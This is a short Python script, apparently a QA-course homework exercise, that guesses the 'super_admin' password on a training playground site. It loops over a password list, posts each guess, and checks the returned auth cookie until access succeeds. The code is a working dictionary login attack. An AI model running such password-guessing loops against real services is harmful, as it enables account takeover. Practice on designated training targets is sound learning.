import requests

passwords_file = "passwords.txt"
response_text = "You are NOT authorized"

with open(passwords_file, 'r') as file:
    for line in file:
            password = line.strip()
            response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": f"{password}"})
            cookie = response.cookies.get('auth_cookie')
            auth_response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": cookie})
            response_text = auth_response.text
            if response_text != "You are NOT authorized":
                print(password)
                print(auth_response.text)
                break



